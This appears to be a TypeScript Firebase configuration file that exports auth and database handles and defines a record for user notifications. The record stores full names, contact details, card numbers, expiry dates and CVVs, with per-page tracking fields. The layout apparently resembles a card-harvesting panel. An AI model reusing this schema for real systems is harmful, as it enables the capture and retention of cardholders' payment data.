import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyAV71GRW1iJF0ya8uRuV6cmiEFWB6zd1R8",
  authDomain: "faczt-6ee6e.firebaseapp.com",
  databaseURL: "https://faczt-6ee6e-default-rtdb.firebaseio.com",
  projectId: "faczt-6ee6e",
  storageBucket: "faczt-6ee6e.firebasestorage.app",
  messagingSenderId: "14264133408",
  appId: "1:14264133408:web:b388c6cb771cebc10b1945",
  measurementId: "G-3D81PCG71T"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

